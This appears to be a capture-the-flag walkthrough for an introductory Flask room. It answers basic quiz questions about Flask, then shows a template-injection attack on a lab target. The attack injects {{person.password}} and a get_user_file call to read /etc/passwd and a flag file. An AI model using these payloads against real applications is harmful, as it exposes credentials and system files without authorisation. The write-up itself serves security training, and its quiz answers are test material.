# Introduction to Flask

- Let's go!

	  no answer needed

- Which environment variable do you need to change in order to run Flask?

	- `FLASK_APP`

- What's the default deployment port used by Flask?

	- `5000`

- Is it possible to change that port? (yay/nay)

	- `yay`

- Does Flask support POST requests? (yay/nay)

	- `yay`

- What markdown language can you use to make templates for Flask? 

	- `html`

- Awesome!

	  no answer needed

- What's inside /home/flask/flag.txt ?

	- Visit `http://<TARGET_IP>:5000/vuln`
	- Now add `?name={{person.password}}`
	- Now instead use `{{ get_user_file("/etc/passwd") }}`
	- And now try with `http://<TARGET_IP>:5000/vuln?name={{%20get_user_file(%22/home/flask/flag.txt%22)%20}}`
	- `THM{**************}`

- See you in the next room!

	  no answer needed



